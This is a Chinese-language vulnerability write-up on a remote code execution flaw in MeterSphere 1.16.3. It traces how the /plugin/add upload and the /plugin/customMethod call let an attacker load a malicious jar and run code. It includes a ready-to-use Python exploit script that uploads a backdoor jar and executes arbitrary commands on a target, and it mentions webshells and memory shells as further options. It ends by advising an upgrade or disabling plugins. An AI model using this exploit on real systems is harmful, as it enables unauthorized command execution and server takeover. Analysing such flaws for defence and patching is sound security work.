## 背景

MeterSphere是一站式开源持续测试平台, 涵盖测试跟踪、接口测试、性能测试、
团队协作等功能，兼容JMeter等开源标准，有效助力开发和测试团队充分利用云弹性进行高度可扩展的自动化测试，加速高质量的软件交付，推动中国测试行业整体效率的提升。

2022年1月5日知道创宇404积极防御实验室团队发现了MeterSphere开源持续测试平台的一处新的远程代码执行漏洞

## 分析

metersphere 官方新发布的1.16.4版本对漏洞进行了修复  
看下修复详情：看起来就是删除了/plugin路由。所以目标范围缩小到了/plugin路由里  
![](https://image.3001.net/images/20220110/1641821243_61dc343bb49fa9983faa4.png)  
下载[1.16.3的源码](https://github.com/metersphere/metersphere/archive/refs/tags/v1.16.3.zip)，分析一波  
打开后发现是前后端分离的，我们需要分析的是后端，所以直接用idea打开backend，搜索/plugin，找到路由对应方法

![](https://image.3001.net/images/20220110/1641821245_61dc343d543171a8a33f4.png)  
先看/add，看起来是上传插件，看下editPlugin方法  
![](https://image.3001.net/images/20220110/1641821247_61dc343f060a037edba33.png)  
![](https://image.3001.net/images/20220110/1641821248_61dc3440794ec3ac52bc1.png)  
再看loadJar：这个方法把jar包加到了loadpath中（这种写法相当于固定搭配，把jar包添加到load path中，后面加载类时会从这个路径查询）  
![](https://image.3001.net/images/20220110/1641821250_61dc34421328880ae33fe.png)  
再回头看下getSubClass方法：读取jar包名对应的配置文件，再根据配置文件对类进行加载，这里因为我们没法写入配置文件，所以这一步会报错，返回NULL  
![](https://image.3001.net/images/20220110/1641821251_61dc34438cf2909ea835c.png)  
因为classes为NULL，所以/plugin/add路由运行到这里就结束了

至此，总结下，通过/plugin/add，我们可以上传任意jar包，jar包会被添加进load path，只要能加载、并初始化类，就能任意代码执行

再继续看其它路由，list、get、delete是插件的删除查找，先跳过，看下/customMethod  
看下customMethod方法：加载类，并调用类的customMethod方法  
![](https://image.3001.net/images/20220110/1641821252_61dc3444da32c51047136.png)  
这里加载、实例化的类，来自request

看一下PluginRequest类：lombok库会在运行时，会向有Data注解的类的字节码中写入get和set方法，最终得到类似javaBean的class  
![](https://image.3001.net/images/20220110/1641821254_61dc34460c6950023dae1.png)

所以，getEntry、getRequest就是获取entry、request参数

至此，这个漏洞就明了了，上传插件时会将jar包路径添加到load
path，后面再通过/customMethod，实例化jar包中的class，并调用customMethod方法，导致命令执行

## POC编写

先是构造恶意jar包  
![](https://image.3001.net/images/20220110/1641821255_61dc34477597ff52c49cd.png)  
把exp2打包jar包，上传插件  
如图，代码执行成功  
![](https://image.3001.net/images/20220110/1641821256_61dc34488cd98e145a748.png)

任意代码执行，利用姿势很多，可以命令执行、写webshell、内存马等  
本篇就以命令执行为例，写个exp

    
    
    import requests
    import sys
    import base64
    import json
    
    if len(sys.argv) != 3:
        print('python exp.py <target> upload/<cmd>')
        print('例: \n先上传后门:python exp.py http://1.1.1.1:8081 upload\n命令执行:python exp.py http://1.1.1.1:8081 whoami\n')
        exit(0)
    baseJar='<base64编码有敏感字符串，放评论区了>'
    url1=sys.argv[1]
    cmd=sys.argv[2]
    if cmd == 'upload':
        req = requests.post(url1+'/plugin/add',files = {'file': ('exp.jar', base64.b64decode(baseJar.encode('utf-8')), 'text/plain')})
        if '解析插件失败，未找到入口配置' in req.content.decode('utf-8'):
            print('上传成功')
        else:
            print('漏洞不存在')
    else:
        header = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'
        }
        req = requests.post(url1+'/plugin/customMethod',data='{"entry":"exec","request":"'+cmd+'"}',headers=header)
        try:
            res = json.loads(req.content.decode('utf-8'))
            print(res['data'])
        except:
            print('出错')
    

![](https://image.3001.net/images/20220110/1641821257_61dc3449823b6a29413cf.png)

## 总结

在上传插件时，将jar包存到了load
path路径，配合customMethod，就可以实例化jar包中的类，并调用customMethod方法，导致任意代码执行

## 修复建议

升级最新版或手动关闭plugin功能

